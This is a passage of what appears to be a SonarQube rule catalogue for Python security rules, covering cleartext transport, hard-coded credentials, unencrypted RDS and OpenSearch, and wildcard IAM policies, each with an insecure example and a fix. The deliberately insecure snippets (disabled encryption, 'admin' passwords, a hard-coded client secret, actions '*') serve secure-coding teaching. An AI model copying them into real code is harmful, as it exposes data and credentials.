<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/Stream.html" rel="nofollow">aws_cdk.aws_kinesis.Stream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
)

stream &#61; kinesis.Stream(self,
    &#34;stream-explicit-unencrypted&#34;,
    shard_count&#61;1,
    encryption&#61;kinesis.StreamEncryption.UNENCRYPTED # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<pre>
url &#61; &#34;https://example.com&#34;
url &#61; &#34;sftp://anonymous&#64;example.com&#34;
url &#61; &#34;ssh://anonymous&#64;example.com&#34;

import ftplib
cnx &#61; ftplib.FTP_TLS(&#34;ftp.example.com&#34;)

import smtplib
smtp &#61; smtplib.SMTP(&#34;smtp.example.com&#34;, port&#61;587)
smtp.starttls(context&#61;context)

smtp_ssl &#61; smtplib.SMTP_SSL(&#34;smtp.gmail.com&#34;, port&#61;465)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationLoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

lb &#61; elbv2.ApplicationLoadBalancer(
    self,
    &#34;LB&#34;,
    vpc&#61;vpc,
    internet_facing&#61;True
)

lb.add_listener(
    &#34;Listener-https-explicit&#34;,
    protocol&#61;elbv2.ApplicationProtocol.HTTPS,
    certificates&#61;[elbv2.ListenerCertificate(&#34;certificateARN&#34;)],
    port&#61;443,
    open&#61;True
)

lb.add_listener(
    &#34;Listener-https-implicit&#34;,
    certificates&#61;[elbv2.ListenerCertificate(&#34;certificateARN&#34;)],
    port&#61;8443,
    open&#61;True
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/ApplicationListener.html" rel="nofollow">
aws_cdk.aws_elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.ApplicationListener(
    self,
    &#34;listener-https-explicit-const&#34;,
    load_balancer&#61;lb,
    protocol&#61;elbv2.ApplicationProtocol.HTTPS,
    certificates&#61;[elbv2.ListenerCertificate(&#34;certificateARN&#34;)],
    port&#61;444,
    open&#61;True
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkLoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)
lb &#61; elbv2.NetworkLoadBalancer(
    self,
    &#34;LB&#34;,
    vpc&#61;vpc,
    internet_facing&#61;True
)

lb.add_listener(
    &#34;Listener-TLS-explicit&#34;,
    protocol&#61;elbv2.Protocol.TLS,
    certificates&#61;[elbv2.ListenerCertificate(&#34;certificateARN&#34;)],
    port&#61;443
)
lb.add_listener(
    &#34;Listener-TLS-implicit&#34;,
    certificates&#61;[elbv2.ListenerCertificate(&#34;certificateARN&#34;)],
    port&#61;1024
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/NetworkListener.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.NetworkListener(
    self,
    &#34;Listener-TLS-explicit&#34;,
    protocol&#61;elbv2.Protocol.TLS,
    certificates&#61;[elbv2.ListenerCertificate(&#34;certificateARN&#34;)],
    port&#61;443,
    load_balancer&#61;lb
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancingv2/CfnListener.html" rel="nofollow">aws_cdk.aws_elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancingv2 as elbv2,
)

elbv2.CfnListener(
    self,
    &#34;listener-https&#34;,
    default_actions&#61;[application_default_action],
    load_balancer_arn&#61;lb.load_balancer_arn,
    protocol&#61;&#34;HTTPS&#34;,
    port&#61;443,
    certificates&#61;[elbv2.CfnListener.CertificateProperty(
        certificate_arn&#61;&#34;certificateARN&#34;
    )]
)

elbv2.CfnListener(
    self,
    &#34;listener-tls&#34;,
    default_actions&#61;[network_default_action],
    load_balancer_arn&#61;lb.load_balancer_arn,
    protocol&#61;&#34;TLS&#34;,
    port&#61;1001,
    certificates&#61;[elbv2.CfnListener.CertificateProperty(
        certificate_arn&#61;&#34;certificateARN&#34;
    )]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancerListener.html" rel="nofollow">aws_cdk.aws_elasticloadbalancing.LoadBalancerListener</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancerListener(
    external_port&#61;10043,
    external_protocol&#61;elb.LoadBalancingProtocol.SSL,
    internal_port&#61;10043,
    ssl_certificate_arn&#61;&#34;certificateARN&#34;
)

elb.LoadBalancerListener(
    external_port&#61;10443,
    external_protocol&#61;elb.LoadBalancingProtocol.HTTPS,
    internal_port&#61;10443,
    ssl_certificate_arn&#61;&#34;certificateARN&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/CfnLoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.CfnLoadBalancer(
    self,
    &#34;elb-ssl&#34;,
    listeners&#61;[
        elb.CfnLoadBalancer.ListenersProperty(
            instance_port&#61;&#34;10043&#34;,
            load_balancer_port&#61;&#34;10043&#34;,
            protocol&#61;&#34;ssl&#34;,
            ssl_certificate_id&#61;CERTIFICATE_ARN
        )
    ],
    subnets&#61;vpc.select_subnets().subnet_ids
)

elb.CfnLoadBalancer(
    self,
    &#34;elb-https-dict&#34;,
    listeners&#61;[
        {
            &#34;instancePort&#34;:&#34;10443&#34;,
            &#34;loadBalancerPort&#34;:&#34;10443&#34;,
            &#34;protocol&#34;:&#34;https&#34;,
            &#34;sslCertificateId&#34;:CERTIFICATE_ARN
        }
    ],
    subnets&#61;vpc.select_subnets().subnet_ids
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticloadbalancing/LoadBalancer.html" rel="nofollow">aws_cdk.aws_elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticloadbalancing as elb,
)

elb.LoadBalancer(
    self,
    &#34;elb-ssl&#34;,
    vpc&#61;vpc,
    listeners&#61;[
        {
            &#34;externalPort&#34;:10044,
            &#34;externalProtocol&#34;:elb.LoadBalancingProtocol.SSL,
            &#34;internalPort&#34;:10044,
            &#34;sslCertificateArn&#34;:&#34;certificateARN&#34;
        },
        {
            &#34;externalPort&#34;:10444,
            &#34;externalProtocol&#34;:elb.LoadBalancingProtocol.HTTPS,
            &#34;internalPort&#34;:10444,
            &#34;sslCertificateArn&#34;:&#34;certificateARN&#34;
        }
    ]
)

loadBalancer &#61; elb.LoadBalancer(
        self,
        &#34;elb-multi-listener&#34;,
        vpc&#61;vpc
)
loadBalancer.add_listener(
    external_port&#61;10045,
    external_protocol&#61;elb.LoadBalancingProtocol.SSL,
    internal_port&#61;10045,
    ssl_certificate_arn&#61;&#34;certificateARN&#34;
)
loadBalancer.add_listener(
    external_port&#61;10445,
    external_protocol&#61;elb.LoadBalancingProtocol.HTTPS,
    internal_port&#61;10445,
    ssl_certificate_arn&#61;&#34;certificateARN&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_elasticache/CfnReplicationGroup.html" rel="nofollow">aws_cdk.aws_elasticache.CfnReplicationGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_elasticache as elasticache
)

elasticache.CfnReplicationGroup(
    self,
    &#34;encrypted-explicit&#34;,
    replication_group_description&#61;&#34;a test replication group&#34;,
    automatic_failover_enabled&#61;False,
    transit_encryption_enabled&#61;True,
    cache_subnet_group_name&#61;&#34;test&#34;,
    engine&#61;&#34;redis&#34;,
    engine_version&#61;&#34;3.2.6&#34;,
    num_cache_clusters&#61;1,
    cache_node_type&#61;&#34;cache.t2.micro&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/CfnStream.html" rel="nofollow">aws_cdk.aws_kinesis.CfnStream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
)

kinesis.CfnStream(
    self,
    &#34;cfnstream-explicit-encrytped&#34;,
    shard_count&#61;1,
    stream_encryption&#61;kinesis.CfnStream.StreamEncryptionProperty(
        encryption_type&#61;&#34;KMS&#34;,
        key_id&#61;&#34;alias/aws/kinesis&#34;
    )
)

stream &#61; kinesis.CfnStream(
    self,
    &#34;cfnstream-explicit-encrytped-dict&#34;,
    shard_count&#61;1,
    stream_encryption&#61;{
        &#34;encryptionType&#34;: &#34;KMS&#34;,
        &#34;keyId&#34;: &#34;alias/aws/kinesis&#34;
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_kinesis/Stream.html" rel="nofollow">aws_cdk.aws_kinesis.Stream</a>:</p>
<pre>
from aws_cdk import (
    aws_kinesis as kinesis,
    aws_kms as kms
)

stream &#61; kinesis.Stream( # Encryption is enabled by default for Streams
    self,
    &#34;stream-implicit-encrypted&#34;,
    shard_count&#61;1
)

stream &#61; kinesis.Stream(
    self,
    &#34;stream-explicit-encrypted-managed&#34;,
    shard_count&#61;1,
    encryption&#61;kinesis.StreamEncryption.MANAGED
)

key &#61; kms.Key(self, &#34;managed_key&#34;)
stream &#61; kinesis.Stream(
    self,
    &#34;stream-explicit-encrypted-selfmanaged&#34;,
    shard_count&#61;1,
    encryption&#61;kinesis.StreamEncryption.KMS,
    encryption_key&#61;key
)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2068">
              python:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
username &#61; &#39;admin&#39;
password &#61; &#39;admin&#39; # Sensitive
usernamePassword &#61; &#39;user&#61;admin&amp;password&#61;admin&#39; # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import os

username &#61; os.getenv(&#34;username&#34;) # Compliant
password &#61; os.getenv(&#34;password&#34;) # Compliant
usernamePassword &#61; &#39;user&#61;%s&amp;password&#61;%s&#39; % (username, password) # Compliant{code}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6303">
              python:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br /> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul><li> A malicious insider working at the cloud provider gains physical access to the storage device. </li><li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li></ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul><li> theft of intellectual property and/or personal data </li><li> extortion </li><li> denial of services and security bypasses via data corruption or deletion </li></ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br /> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html" rel="nofollow">aws_cdk.aws_rds.DatabaseCluster</a> and <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html" rel="nofollow">aws_cdk.aws_rds.DatabaseInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.DatabaseCluster( # Sensitive, unencrypted by default
            self,
            &#34;example&#34;
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html" rel="nofollow">aws_cdk.aws_rds.CfnDBCluster</a> and <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.CfnDBCluster( # Sensitive, unencrypted by default
            self,
            &#34;example&#34;
        )
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html" rel="nofollow">aws_cdk.aws_rds.DatabaseCluster</a> and <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html" rel="nofollow">aws_cdk.aws_rds.DatabaseInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.DatabaseCluster(
            self,
            &#34;example&#34;,
            storage_encrypted&#61;True
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html" rel="nofollow">aws_cdk.aws_rds.CfnDBCluster</a> and <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_rds as rds
)

class DatabaseStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        rds.CfnDBCluster(
            self,
            &#34;example&#34;,
            storage_encrypted&#61;True
        )
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html" rel="nofollow">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6302">
              python:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul><li> only require a subset of these permissions to perform the intended function. </li><li> have monitored activity showing that only a subset of these permissions is actually used. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, Effect

PolicyStatement(
    effect&#61;Effect.ALLOW,
    actions&#61;[&#34;*&#34;], # Sensitive
    resources&#61;[&#34;arn:aws:iam:::user/*&#34;]
)
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, Effect

PolicyStatement(
    effect&#61;Effect.ALLOW,
    actions&#61;[&#34;iam:GetAccountSummary&#34;],
    resources&#61;[&#34;arn:aws:iam:::user/*&#34;]
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cloud.google.com/iam/docs/understanding-roles" rel="nofollow">Google Cloud Documentation</a> - Understanding roles </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6308">
              python:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>
<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any
version), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>
<ul><li> indices </li><li> logs </li><li> swap files </li><li> data in the application directory </li><li> automated snapshots </li></ul>
<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>
<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/Domain.html" rel="nofollow">aws_cdk.aws_opensearchservice.Domain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import Domain, EngineVersion

class DomainStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        Domain(self, &#34;Sensitive&#34;,
            version&#61;EngineVersion.OPENSEARCH_1_3
        ) # Sensitive, encryption is disabled by default
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/CfnDomain.html" rel="nofollow">aws_cdk.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import CfnDomain

class CfnDomainStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        CfnDomain(self, &#34;Sensitive&#34;) # Sensitive, encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/Domain.html" rel="nofollow">aws_cdk.aws_opensearchservice.Domain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import Domain, EncryptionAtRestOptions, EngineVersion

class DomainStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        Domain(self, &#34;Compliant&#34;,
            version&#61;EngineVersion.OPENSEARCH_1_3,
            encryption_at_rest&#61;EncryptionAtRestOptions(
                enabled&#61;True
            )
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_opensearchservice/CfnDomain.html" rel="nofollow">aws_cdk.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
from aws_cdk.aws_opensearchservice import CfnDomain

class CfnDomainStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        CfnDomain(self, &#34;Compliant&#34;,
            encryption_at_rest_options&#61;CfnDomain.EncryptionAtRestOptionsProperty(
                enabled&#61;True
            )
        )
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html" rel="nofollow">AWS Documentation</a> - Encryption of
  data at rest for Amazon OpenSearch Service </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6437">
              python:S6437
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A hard-coded secret has been found in your code. You should quickly list where this secret is used, revoke it, and then change it in every system
that uses it.</p>
<p>Passwords, secrets, and any type of credentials should only be used to authenticate a single entity (a person or a system).</p>
<p>If you allow third parties to authenticate as another system or person, they can impersonate legitimate identities and undermine trust within the
organization.<br /> It does not matter if the impersonation is malicious: In either case, it is a clear breach of trust in the system, as the systems
involved falsely assume that the authenticated entity is who it claims to be.<br /> The consequences can be catastrophic.</p>
<p>Keeping credentials in plain text in a code base is tantamount to sharing that password with anyone who has access to the source code and runtime
servers.<br /> Thus, it is a breach of trust, as these individuals have the ability to impersonate others.</p>
<p>Secret management services are the most efficient tools to store credentials and protect the identities associated with them.<br /> Cloud providers
and on-premise services can be used for this purpose.</p>
<p>If storing credentials in a secret data management service is not possible, follow these guidelines:</p>
<ul><li> Do not store credentials in a file that an excessive number of people can access.
    <ul><li> For example, not in code, not in a spreadsheet, not on a sticky note, and not on a shared drive. </li></ul>  </li><li> Use the production operating system to protect password access control.
    <ul><li> For example, in a file whose permissions are restricted and protected with chmod and chown. </li></ul>  </li></ul>
<h3>Noncompliant code example</h3>
<pre>
from requests_oauthlib.oauth2_session import OAuth2Session

scope &#61; [&#39;https://www.api.example.com/auth/example.data&#39;]

oauth &#61; OAuth2Session(
    &#39;example_client_id&#39;,
    redirect_uri&#61;&#39;https://callback.example.com/uri&#39;,
    scope&#61;scope)

token &#61; oauth.fetch_token(
        &#39;https://api.example.com/o/oauth2/token&#39;,
        client_secret&#61;&#39;example_Password&#39;) # Noncompliant

data &#61; oauth.get(&#39;https://www.api.example.com/oauth2/v1/exampledata&#39;)
</pre>
<h3>Compliant solution</h3>
<p>Using <a href="https://github.com/awsdocs/aws-doc-sdk-examples/tree/main/javav2/example_code/secretsmanager" rel="nofollow">AWS Secrets Manager</a>:</p>
<pre>
import boto3
from requests_oauthlib.oauth2_session import OAuth2Session

def get_client_secret():

    session &#61; boto3.session.Session()
    client &#61; session.client(service_name&#61;&#39;secretsmanager&#39;, region_name&#61;&#39;eu-west-1&#39;)

    return client.get_secret_value(SecretId&#61;&#39;example_oauth_secret_id&#39;)

client_secret &#61; get_client_secret()
scope &#61; [&#39;https://www.api.example.com/auth/example.data&#39;]

oauth &#61; OAuth2Session(
    &#39;example_client_id&#39;,
    redirect_uri&#61;&#39;https://callback.example.com/uri&#39;,
    scope&#61;scope)

token &#61; oauth.fetch_token(
        &#39;https://api.example.com/o/oauth2/token&#39;,
        client_secret&#61;client_secret)

data &#61; oauth.get(&#39;https://www.api.example.com/oauth2/v1/exampledata&#39;)
</pre>
<p>Using <a href="https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-java?tabs&#61;azure-cli" rel="nofollow">Azure Key Vault Secret</a>:</p>
<pre>
from azure.keyvault.secrets import SecretClient
from azure.identity import DefaultAzureCredential

def get_client_secret():
    vault_uri &#61; &#34;https://example.vault.azure.net&#34;
    credential &#61; DefaultAzureCredential()
    client &#61; SecretClient(vault_url&#61;vault_uri, credential&#61;credential)

    return client.get_secret(&#39;example_oauth_secret_name&#39;)

client_secret &#61; get_client_secret()
scope &#61; [&#39;https://www.api.example.com/auth/example.data&#39;]

oauth &#61; OAuth2Session(
    &#39;example_client_id&#39;,
    redirect_uri&#61;&#39;https://callback.example.com/uri&#39;,
    scope&#61;scope)

token &#61; oauth.fetch_token(
